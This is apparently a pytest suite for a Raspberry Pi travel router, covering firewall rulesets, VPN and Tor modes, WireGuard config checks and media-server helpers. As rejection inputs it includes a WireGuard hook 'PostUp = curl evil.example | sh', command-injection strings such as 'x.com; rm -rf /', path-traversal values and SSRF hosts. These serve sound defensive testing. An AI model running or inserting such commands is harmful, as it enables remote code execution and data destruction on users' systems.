import pytest

from travelpi import fw
from travelpi.net import exit_in_use, next_exit, parse_scan, parse_trace, portal_from_probe, split_nmcli
from travelpi.screen import apply_cal, calibrate_from


def test_tunnel_policy_only_allows_tailscale():
    r = fw.ruleset("tunnel")
    assert 'iifname "wlap" oifname "tailscale0" counter accept' in r
    assert r.index('oifname "tailscale0" counter accept') < r.index('iifname "wlap" counter drop')     # allow before the catch-all drop
    assert 'meta nfproto ipv6 drop' in r and "masquerade" in r
    assert "maxseg size set rt mtu" in r
    assert r.startswith("table inet travelpi\ndelete table inet travelpi")              # replace, never stack


def test_open_and_block_policies():
    assert 'iifname "wlap" oifname != "wlap" counter accept' in fw.ruleset("open")
    b = fw.ruleset("block")
    assert 'iifname "wlap" counter drop' in b and 'iifname "wlap" oifname "tailscale0" counter accept' not in b
    with pytest.raises(ValueError):
        fw.ruleset("whatever")


def test_failover_order():
    assert next_exit("home", ["home"]) is None          # tried everything → look for a hotel login page


def test_probe_and_trace():
    assert portal_from_probe("204") == "online"
    assert portal_from_probe("302") == "portal" and portal_from_probe("200") == "portal"
    assert portal_from_probe("000") == "offline" and portal_from_probe("") == "offline"
    assert parse_trace("fl=1\nip=203.0.113.7\nloc=AU\ncolo=SYD\n") == {"ip": "203.0.113.7", "loc": "AU", "colo": "SYD"}


def test_scan_parsing_dedupes_and_sorts():
    out = "\n".join([" :Hotel Guest:40:WPA2", " :Hotel Guest:71:WPA2", "*:Home\\:5G:55:WPA2 WPA3",
                     " :Airport Free:80:", " ::90:WPA2"])
    nets = parse_scan(out)
    assert [n["ssid"] for n in nets] == ["Home:5G", "Airport Free", "Hotel Guest"]   # connected first, hidden dropped
    assert nets[2]["signal"] == 71 and nets[1]["secure"] is False and nets[0]["active"]
    assert split_nmcli("a\\:b:c") == ["a:b", "c"]


@pytest.mark.parametrize("swap", [False, True])
def test_calibration_round_trip(swap):
    # fake panel: raw x = 4000 - 9*sx, raw y = 300 + 11*sy (optionally axes swapped)
    def raw(sx, sy):
        a, b = 4000 - 9 * sx, 300 + 11 * sy
        return (b, a) if swap else (a, b)
    pts = [(40, 40), (440, 40), (40, 280)]
    cal = calibrate_from([raw(*p) for p in pts], pts)
    assert cal["swap"] is swap
    for p in [(10, 10), (240, 160), (470, 310)]:
        assert apply_cal(cal, *raw(*p)) == p


def test_exit_in_use_needs_online_matching_exit_node():
    peers = {"k1": {"HostName": "exit-a", "ExitNode": True}, "k2": {"HostName": "exit-b", "ExitNode": False}}
    assert exit_in_use({"ExitNodeStatus": {"ID": "k1", "Online": True}, "Peer": peers}, "exit-a")
    assert not exit_in_use({"ExitNodeStatus": {"ID": "k1", "Online": True}, "Peer": peers}, "exit-b")
    assert not exit_in_use({"ExitNodeStatus": {"ID": "k1", "Online": False}, "Peer": peers}, "exit-a")
    assert not exit_in_use({"Peer": peers}, "exit-a")          # no exit node in use at all


def test_kids_dns_redirect_and_dot_block():
    r = fw.ruleset("tunnel", ["AA:BB:CC:DD:EE:01"])
    assert 'ether saddr { aa:bb:cc:dd:ee:01 } meta l4proto { tcp, udp } th dport 53 dnat ip to 94.140.14.15' in r
    assert 'ether saddr { aa:bb:cc:dd:ee:01 } tcp dport 853 drop' in r
    assert r.index("94.140.14.15") < r.index("dnat ip to 10.42.0.1")          # kids rule wins over the general one
    assert "94.140.14.15" not in fw.ruleset("tunnel")


def test_hotel_network_cannot_reach_the_pi():
    r = fw.ruleset("tunnel")
    for dev in ("wlup", "eth0", "usb*", "enx*"):
        assert f'iifname "{dev}" ct state established,related accept' in r
        assert f'iifname "{dev}" drop' in r
    assert "udp dport { 68, 546, 41641 } accept" in r
    assert 'th dport 53 ip daddr != 10.42.0.1 dnat ip to 10.42.0.1' in r        # devices can't dodge AdGuard


def test_api_access():
    from travelpi.web import allowed
    assert allowed("10.42.0.55", "", "tok")                 # on our Wi-Fi
    assert not allowed("100.100.10.20", "", "tok")          # over Tailscale without the token
    assert allowed("100.100.10.20", "tok", "tok")
    assert not allowed("100.100.10.20", "", "")             # no token configured → nobody from outside
    assert not allowed("garbage", "tok", "tok")


def test_leases_and_speed_units():
    from travelpi.net import is_phone_dev, mbps, parse_leases
    leases = parse_leases("1792262429 32:3E:3b:e3:12:40 10.42.0.102 Family-iPhone 01:32\n1792 aa:bb:cc:dd:ee:ff 10.42.0.50 * *\n")
    assert leases == [{"mac": "32:3e:3b:e3:12:40", "ip": "10.42.0.102", "name": "Family-iPhone"},
                      {"mac": "aa:bb:cc:dd:ee:ff", "ip": "10.42.0.50", "name": ""}]
    assert mbps("5000000") == 40.0 and mbps("x") == 0.0
    assert is_phone_dev("usb0") and is_phone_dev("enx0a1b2c") and not is_phone_dev("wlup")


def test_tor_policy():
    r = fw.ruleset("tor")
    assert 'meta l4proto tcp redirect to :9040' in r and "9053" not in r      # DNS stays on our own resolver
    assert 'iifname "wlap" counter drop' in r                 # nothing is forwarded around Tor
    assert "meta l4proto udp counter reject" in r              # QUIC refused fast → phones fall back to TCP
    k = fw.ruleset("tor", ["aa:bb:cc:dd:ee:01"])
    assert 'ether saddr != { aa:bb:cc:dd:ee:01 } ip daddr != { 10.42.0.1, 100.64.0.0/10 } meta l4proto tcp redirect' in k     # kids skip Tor…
    assert 'ether saddr { aa:bb:cc:dd:ee:01 } oifname "tailscale0" accept' in k        # …and keep the filtered VPN


def test_throttle_decoding():
    from travelpi.hw import decode_throttled
    assert decode_throttled(0) == []
    assert decode_throttled(0x50005) == ["under-voltage now", "throttled now", "under-voltage since boot", "throttled since boot"]


def test_proton_exits_and_modes(tmp_path, monkeypatch):
    from travelpi import wg
    monkeypatch.setattr(wg, "PREFERRED", ["sg", "jp", "us", "nl", "ch"])      # not whatever this router has saved
    from travelpi.net import build_modes
    for cc in ("us", "sg", "ch"):
        (tmp_path / f"proton-{cc}.conf").write_text("[Interface]\nAddress = 10.2.0.2/32, 2a07::2/128\n")
    (tmp_path / "mullvad-au.conf").write_text("[Interface]\nAddress = 10.66.0.2/32\n")   # any WireGuard provider
    (tmp_path / "notes.conf").write_text("x")                                           # not <provider>-<cc>: ignored
    ex = wg.exits(tmp_path)
    assert [e["id"] for e in ex] == ["proton-sg", "proton-us", "proton-ch", "mullvad-au"]   # preferred order first
    assert ex[0]["label"] == "Singapore" and ex[0]["kind"] == "wg" and ex[0]["sub"] == "Proton free"
    assert ex[3]["label"] == "Australia" and ex[3]["where"] == "Mullvad Australia"
    assert wg.address("[Interface]\nAddress = 2a07::2/128, 10.2.0.2/32\n") == "10.2.0.2/32"
    home = {"id": "home", "kind": "ts", "node": "my-exit-node", "label": "Home", "where": "Home internet", "text": "Home only"}
    modes = build_modes(ex + [home])
    assert list(modes) == ["auto", "proton-sg", "proton-us", "proton-ch", "mullvad-au", "home", "tor", "direct", "block"]
    assert modes["home"] == "Home only"
    assert list(build_modes(ex)) == ["auto", "proton-sg", "proton-us", "proton-ch", "mullvad-au", "direct", "block"]  # Tor needs Tailscale
    assert list(build_modes([])) == ["direct", "block"]                    # no VPN set up yet
    assert next_exit("proton-sg", ["proton-sg", "proton-us", "home"]) == "proton-us"
    assert next_exit("home", ["proton-sg", "home"]) is None


def test_wg_policy():
    r = fw.ruleset("wg")
    assert 'iifname "wlap" oifname "wgx" counter accept' in r and 'iifname "wlap" oifname "tailscale0" counter accept' not in r


def test_tailnet_reachable_in_every_mode():
    for p in ("tunnel", "wg", "tor", "block", "open"):
        assert 'iifname "wlap" ip daddr 100.64.0.0/10 oifname "tailscale0" counter accept' in fw.ruleset(p)
    assert "ip daddr != { 10.42.0.1, 100.64.0.0/10 } meta l4proto tcp redirect" in fw.ruleset("tor")   # not into Tor


def test_exit_country(tmp_path, monkeypatch):
    from travelpi import geo
    (tmp_path / "geoip").write_text("# x\n1834549248,1834614783,AT\n3232235520,3232235775,SG\n")   # 109.89.x – fake
    monkeypatch.setattr(geo, "_tor", geo._TorGeo(str(tmp_path / "geoip")))
    assert geo.exit_country({"loc": "T1", "ip": "109.89.0.5"}) == "Austria (Tor)"
    assert geo.exit_country({"loc": "T1", "ip": "8.8.8.8"}) == "Tor"
    assert geo.exit_country({"loc": "SG"}) == "Singapore" and geo.exit_country({"loc": "AU"}) == "Australia"
    assert geo.exit_country({}) == ""


def test_device_byte_counting():
    from travelpi.stats import add_deltas, parse_set
    js = '{"nftables": [{"set": {"name": "down", "elem": [{"elem": {"val": "10.42.0.102", "counter": {"packets": 3, "bytes": 252}}}]}}]}'
    assert parse_set(js) == {"10.42.0.102": 252}
    per, last, macs = {}, {}, {"10.42.0.102": "aa"}
    add_deltas(per, last, {"10.42.0.102": 1000}, macs)       # first reading only sets the baseline
    add_deltas(per, last, {"10.42.0.102": 1500}, macs)
    add_deltas(per, last, {"10.42.0.102": 200}, macs)        # counters restarted (table recreated)
    assert per == {"aa": 700}


def test_adguard_upstreams_follow_the_mode():
    from travelpi import adguard
    from travelpi.config import TUNNEL_DNS
    up, fb = adguard.upstreams_for(TUNNEL_DNS, tunnel=True)
    assert up == adguard.DOH and fb == adguard.FALLBACK                   # VPN: encrypted DNS through the tunnel
    up, fb = adguard.upstreams_for(["192.168.7.1"], tunnel=False)
    assert up == ["192.168.7.1"] and fb == adguard.DOH                    # hotel login / direct: the hotel's DNS
    assert adguard.upstreams_for([], tunnel=False)[0] == ["1.1.1.1"]


def test_adguard_summary():
    from travelpi import adguard
    st = {"num_dns_queries": 400, "num_blocked_filtering": 60, "avg_processing_time": 0.0042,
          "top_blocked_domains": [{"ads.example": 30}, {"track.example": 12}],
          "top_clients": [{"10.42.0.23": 250}, {"10.42.0.31": 150}]}
    s = adguard.summarise(st, {"protection_enabled": True}, {"10.42.0.23": "Family-iPhone"})
    assert (s["blocked"], s["queries"], s["pct"], s["on"], s["ms"]) == (60, 400, 15, True, 4.2)
    assert s["top"] == ["ads.example", "track.example"]
    assert s["clients"][0] == {"ip": "10.42.0.23", "name": "Family-iPhone", "queries": 250}
    assert s["clients"][1]["name"] == "10.42.0.31"                         # no DHCP name → its address
    paused = adguard.summarise({}, {"protection_enabled": False, "protection_disabled_until": "2026-10-19T10:10:00Z"},
                               {}, now=1792404000.0)                       # 10:00 UTC → 10 minutes left
    assert paused["on"] is False and paused["paused_min"] == 10 and paused["pct"] == 0


def test_adblock_inputs_and_blocked_items():
    from travelpi import adguard
    assert adguard.clean_domain("https://Ads.Example.com/path") == "ads.example.com"
    for bad in ("", "not a domain", "a..b", "-x.com", "x.com; rm -rf /"):
        with pytest.raises(ValueError):
            adguard.clean_domain(bad)
    with pytest.raises(ValueError):
        adguard.act({"action": "add_list", "url": "http://insecure.example/list.txt"})
    with pytest.raises(ValueError):
        adguard.act({"action": "pause", "minutes": 99999})
    with pytest.raises(ValueError):
        adguard.act({"action": "rm -rf"})
    log = {"data": [{"time": "2026-10-19T12:00:00Z", "client": "10.42.0.91", "question": {"name": "ads.example"},
                     "rules": [{"text": "||ads.example^", "filter_list_id": 1}]},
                    {"time": "2026-10-19T11:59:00Z", "client": "10.42.0.50", "question": {"name": "mine.example"},
                     "rules": [{"text": "||mine.example^", "filter_list_id": 0}]}]}
    items = adguard.blocked_items(log, {"10.42.0.91": "iPad"}, {1: "AdGuard DNS filter"})
    assert items[0] == {"time": "2026-10-19T12:00:00Z", "domain": "ads.example", "device": "iPad",
                        "list": "AdGuard DNS filter", "rule": "||ads.example^"}
    assert items[1]["list"] == "Your rules" and items[1]["device"] == "10.42.0.50"


GOOD_WG = """[Interface]
# Key for travelpi
PrivateKey = kG7rN0Hc3b1bS3l9f0m2iY5c8VdJ2Qe1uW4xYz6AbCc=
Address = 10.2.0.2/32
DNS = 10.2.0.1

[Peer]
# SG#12
PublicKey = Zx2yQ7Lp9mN4bV6cX8sD1fG3hJ5kL7qW9eR2tY4uI6o=
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.9:51820
"""


def test_wireguard_files_from_the_phone_page(tmp_path):
    import os
    from travelpi import wg
    assert wg.check_conf(GOOD_WG) == GOOD_WG
    for bad in (GOOD_WG.replace("DNS = 10.2.0.1", "PostUp = curl evil.example | sh"),
                GOOD_WG.replace("[Peer]", "[Exec]"), GOOD_WG.replace("Endpoint = 203.0.113.9:51820\n", ""),
                GOOD_WG.replace("Address = 10.2.0.2/32", "Address = fd00::2/128"), "hello", "",
                GOOD_WG.replace("kG7rN0Hc3b1bS3l9f0m2iY5c8VdJ2Qe1uW4xYz6AbCc=", "not-a-key")):
        with pytest.raises(ValueError):
            wg.check_conf(bad)
    assert wg.save("Proton", "SG", GOOD_WG, tmp_path) == "proton-sg"
    f = tmp_path / "proton-sg.conf"
    assert f.read_text() == GOOD_WG.strip() + "\n" and oct(os.stat(f).st_mode & 0o777) == "0o600"
    assert [e["id"] for e in wg.exits(tmp_path)] == ["proton-sg"]
    for prov, cc in (("../etc", "sg"), ("proton", "s"), ("proton", "../x"), ("", "")):
        with pytest.raises(ValueError):
            wg.save(prov, cc, GOOD_WG, tmp_path)
    with pytest.raises(ValueError):
        wg.remove("../../etc/passwd", tmp_path)
    wg.remove("proton-sg", tmp_path)
    assert not f.exists()


def test_travel_wifi_name_and_password():
    import shlex
    from travelpi.net import check_ap, read_env
    assert check_ap("  Smith Family 5G ", "correct horse") == ("Smith Family 5G", "correct horse")
    for ssid, pw in (("", "longenough"), ("x" * 33, "longenough"), ("ok", "short"), ("ok", "x" * 64),
                     ("bad\nname", "longenough"), ("ok", "pässwörd123")):
        with pytest.raises(ValueError):
            check_ap(ssid, pw)
    tricky_ssid, tricky_pw = "Bob's $(Wi-Fi)", 'p@ss "word" `x` ;'
    text = f"SSID={shlex.quote(tricky_ssid)}\nPSK={shlex.quote(tricky_pw)}\n"
    assert read_env(text) == {"SSID": tricky_ssid, "PSK": tricky_pw}
    assert read_env("SSID=MyTravelWiFi\nPSK=abc123def456\n") == {"SSID": "MyTravelWiFi", "PSK": "abc123def456"}   # old files


def test_kids_devices_can_only_look():
    from travelpi.web import kids_device
    leases = [{"mac": "aa:bb:cc:dd:ee:01", "ip": "10.42.0.50", "name": "Kids-iPad"},
              {"mac": "aa:bb:cc:dd:ee:02", "ip": "10.42.0.51", "name": "Dad"}]
    assert kids_device("10.42.0.50", leases, {"aa:bb:cc:dd:ee:01"})
    assert not kids_device("10.42.0.51", leases, {"aa:bb:cc:dd:ee:01"})
    assert not kids_device("100.100.10.20", leases, {"aa:bb:cc:dd:ee:01"})


def test_settings_file(tmp_path):
    from travelpi.config import DEFAULTS, load_settings, ts_exits
    assert load_settings(tmp_path / "missing.json") == DEFAULTS                # no file → a plain travel router
    f = tmp_path / "settings.json"
    f.write_text('{"name": "Smith Router", "tailscale_exits": [{"node": "nas"}, {"label": "no node"}], "junk": 1}')
    s = load_settings(f)
    assert s["name"] == "Smith Router" and "junk" not in s and s["backup"] == ""
    assert ts_exits(s) == [{"id": "nas", "kind": "ts", "node": "nas", "label": "nas", "where": "nas (Tailscale)"}]
    f.write_text("not json")
    assert load_settings(f) == DEFAULTS


def test_settings_from_the_web_pages(tmp_path):
    import json
    from travelpi.config import DEFAULTS, clean_settings, load_settings, save_settings
    cur = {**DEFAULTS, "backup": "user@host", "home_wifi": "home",
           "tailscale_exits": [{"id": "home", "node": "my-exit-node", "label": "Home", "where": "Home internet", "text": "Home only"}]}
    new = clean_settings({"name": " Smith Router ", "phone_warn_gb": "2.5", "vpn_order": ["US", "sg", "us"],
                          "tailscale_exits": cur["tailscale_exits"] + [{"node": "Nas-Box", "label": "Gran's place"}],
                          "dns_fallback": "100.64.0.10", "sentinel": "", "backup": "evil@x"}, cur, taken={"proton-sg"})
    assert new["name"] == "Smith Router" and new["phone_warn_gb"] == 2.5 and new["vpn_order"] == ["us", "sg"]
    assert new["tailscale_exits"][0] == cur["tailscale_exits"][0]                       # existing id/text kept
    assert new["tailscale_exits"][1] == {"id": "gran-s-place", "node": "nas-box", "label": "Gran's place", "where": "Gran's place (Tailscale)"}
    assert new["backup"] == "user@host"                                                  # not editable from the web
    for bad in ({"name": ""}, {"name": "x" * 25}, {"phone_warn_gb": 0}, {"phone_warn_gb": "lots"}, {"vpn_order": ["usa"]},
                {"vpn_order": "sg"}, {"dns_fallback": "dns.example"}, {"sentinel": "1.2.3"},
                {"tailscale_exits": [{"node": "bad name"}]}, {"tailscale_exits": [{"node": "a", "id": "auto"}]},
                {"tailscale_exits": [{"node": "a", "id": "proton-sg"}]}, {"tailscale_exits": [{"node": f"n{i}"} for i in range(6)]},
                {"tailscale_exits": [{"node": "a", "label": "Home"}, {"node": "b", "label": "home"}]}):
        with pytest.raises(ValueError):
            clean_settings(bad, cur, taken={"proton-sg"})
    f = tmp_path / "settings.json"
    save_settings(new, f)
    assert load_settings(f)["name"] == "Smith Router" and "junk" not in json.loads(f.read_text())


def test_screen_found_by_name_not_number(tmp_path):
    from travelpi.screen import find_fb
    for n, name in ((0, "vc4drmfb"), (1, "fb_ili9486")):            # HDMI took fb0, the little screen is fb1
        (tmp_path / f"fb{n}").mkdir()
        (tmp_path / f"fb{n}" / "name").write_text(name + "\n")
    assert find_fb(tmp_path) == "/dev/fb1"
    assert find_fb(tmp_path / "nothing") == "/dev/fb0"


def test_tv_remote_and_plex_items():
    from travelpi import kodi, plexlib
    assert kodi.fill({"playerid": "{player}", "value": {"step": "smallforward"}}, 1) == {"playerid": 1, "value": {"step": "smallforward"}}
    with pytest.raises(ValueError):
        kodi.fill({"playerid": "{player}"}, None)                      # nothing playing
    with pytest.raises(ValueError):
        kodi.press("rm -rf")
    now = kodi.summarise_playing({"type": "episode", "showtitle": "Bluey", "season": 2, "episode": 5, "title": "Bike"},
                                 {"time": {"hours": 0, "minutes": 3, "seconds": 7}, "totaltime": {"minutes": 7}, "percentage": 44.2, "speed": 0})
    assert now == {"playing": True, "title": "Bluey · S02E05 · Bike", "kind": "episode", "paused": True, "time": 187, "total": 420, "percent": 44.2}
    ep = plexlib.item({"ratingKey": 77, "type": "episode", "title": "Bike", "grandparentTitle": "Bluey", "parentIndex": 2, "index": 5,
                       "grandparentThumb": "/library/metadata/12/thumb/1700", "duration": 420000, "viewOffset": 210000})
    assert ep == {"key": "77", "type": "episode", "title": "Bike", "sub": "Bluey · S02E05", "thumb": "/library/metadata/12/thumb/1700",
                  "playable": True, "progress": 50, "watched": False}
    show = plexlib.item({"ratingKey": 12, "type": "show", "title": "Bluey", "year": 2018, "thumb": "http://evil/x.jpg", "viewCount": 3})
    assert show["playable"] is False and show["thumb"] == "" and show["watched"] and show["sub"] == "2018"
    for bad in ("/etc/passwd", "/library/metadata/1/thumb/2?X-Plex-Token=x", "http://x/library/metadata/1/thumb/2"):
        with pytest.raises(ValueError):
            plexlib.thumb(bad)
    with pytest.raises(ValueError):
        plexlib.stream("1; rm")


def test_kodi_port_only_on_the_pi():
    assert 'iifname != "lo" tcp dport 8080 drop' in fw.ruleset("tunnel")



def test_jellyfin_items_and_channel_lists(tmp_path):
    from travelpi import jellyfin, kodi
    sid, eid = "a" * 32, "b" * 32
    ep = jellyfin.item({"Id": eid, "Type": "Episode", "Name": "Bike", "SeriesName": "Bluey", "ParentIndexNumber": 2,
                        "IndexNumber": 5, "SeriesId": sid, "SeriesPrimaryImageTag": "t",
                        "UserData": {"PlayedPercentage": 49.6, "Played": False}})
    assert ep == {"key": eid, "type": "episode", "title": "Bike", "sub": "Bluey · S02E05", "thumb": f"/Items/{sid}/Images/Primary",
                  "playable": True, "progress": 50, "watched": False}
    mv = jellyfin.item({"Id": sid, "Type": "Movie", "Name": "Up", "ProductionYear": 2009, "ImageTags": {}, "UserData": {"Played": True}})
    assert mv["thumb"] == "" and mv["watched"] and mv["sub"] == "2009" and mv["type"] == "movie"
    for bad in ("/Items/x/Images/Primary", "/Users/1/Items", f"/Items/{sid}/Images/Primary?api_key=x"):
        with pytest.raises(ValueError):
            jellyfin.thumb(bad)
    with pytest.raises(ValueError):
        jellyfin.stream("../../etc")
    assert kodi.clean_lists(["languages/eng", "countries/au", "countries/au", "index"]) == ["languages/eng", "countries/au", "index"]
    for bad in ([], ["../../x"], ["countries/au.m3u"], "countries/au", ["x"] * 13):
        with pytest.raises(ValueError):
            kodi.clean_lists(bad)
    d = tmp_path / "iptv"
    d.mkdir()
    (d / "instance-settings-1.xml").write_text(kodi.instance_xml(1, "languages/eng"))
    (d / "instance-settings-2.xml").write_text(kodi.instance_xml(2, "countries/za"))
    assert kodi.current_lists(d) == ["languages/eng", "countries/za"]
    assert "South Africa (iptv-org)" in kodi.instance_xml(2, "countries/za")


def test_plex_block_message_and_pvr_selfheal():
    from travelpi import plexlib
    assert "Plex Pass" in plexlib.blocked_reason(403, "Downloading requires a Remote Watch Pass or Plex Pass.")
    assert plexlib.blocked_reason(200, "") == "" and "HTTP 500" in plexlib.blocked_reason(500, "oops")


def test_custom_iptv_source(tmp_path):
    from travelpi import kodi
    codes, custom = kodi.clean_sources(["countries/au"], {"name": "My IPTV", "m3u": "https://ex.com/list.m3u?token=a&b=1", "epg": ""})
    assert codes == ["countries/au"] and custom["m3u"].endswith("b=1") and custom["name"] == "My IPTV"
    for bad in ({"m3u": "not a url"}, {"m3u": "ftp://x/list.m3u"}, {"m3u": "https://x/l.m3u", "epg": "nope"}):
        with pytest.raises(ValueError):
            kodi.clean_sources([], bad)
    with pytest.raises(ValueError):
        kodi.clean_sources([], None)                                  # nothing at all
    xml = kodi.instance_source(1, "My IPTV", "https://ex.com/l.m3u?a=1&b=2", "https://ex.com/epg.xml")
    assert "&amp;" in xml and "epgUrl" in xml and "My IPTV" in xml            # & escaped, EPG set
    d = tmp_path / "iptv"
    kodi.set_sources(["countries/au"], {"name": "Mine", "m3u": "https://ex.com/l.m3u", "epg": ""}, d)
    cur = kodi.current_sources(d)
    assert cur["codes"] == ["countries/au"] and cur["custom"]["m3u"] == "https://ex.com/l.m3u" and cur["custom"]["name"] == "Mine"
    kodi.set_sources(["countries/au"], None, d)                        # removing the custom one
    assert kodi.current_sources(d)["custom"] is None


def test_iptv_webplayer_parse_rewrite_and_ssrf():
    from travelpi import iptv
    m3u = ('#EXTM3U\n'
           '#EXTINF:-1 tvg-logo="http://l/cnn.png" group-title="News",CNN HD\n'
           'http://host/live/cnn/index.m3u8\n'
           '#EXTINF:-1 group-title="Sport",ESPN\n'
           'http://host/espn.ts\n')
    ch = list(iptv.parse_m3u(m3u))
    assert ch[0] == {"name": "CNN HD", "logo": "http://l/cnn.png", "group": "News", "url": "http://host/live/cnn/index.m3u8"}
    assert ch[1]["name"] == "ESPN" and ch[1]["logo"] == "" and ch[1]["url"] == "http://host/espn.ts"

    pl = ('#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=1\n720/index.m3u8\n'
          '#EXT-X-KEY:METHOD=AES-128,URI="key.bin"\nseg1.ts\n')
    rw = iptv.rewrite_playlist(pl, "https://cdn.example.com/a/master.m3u8", lambda u: "/tv/stream?u=" + u)
    assert "/tv/stream?u=https://cdn.example.com/a/720/index.m3u8" in rw          # variant playlist → relative resolved
    assert 'URI="/tv/stream?u=https://cdn.example.com/a/key.bin"' in rw           # key URI rewritten
    assert "/tv/stream?u=https://cdn.example.com/a/seg1.ts" in rw                 # segment rewritten
    assert "#EXT-X-STREAM-INF:BANDWIDTH=1" in rw                                  # plain tags untouched

    # SSRF guard: never relay to the home LAN, loopback, link-local or the tailnet
    for host in ("127.0.0.1", "192.168.1.5", "169.254.1.1", "100.64.0.1"):
        assert iptv._blocked(host)
    assert iptv.is_playlist("http://h/x.m3u8", "", b"")
    assert iptv.is_playlist("http://h/x", "application/vnd.apple.mpegurl", b"")
    assert iptv.is_playlist("http://h/x", "", b"#EXTM3U\n")
    assert not iptv.is_playlist("http://h/x.ts", "video/mp2t", b"\x47\x40\x00")
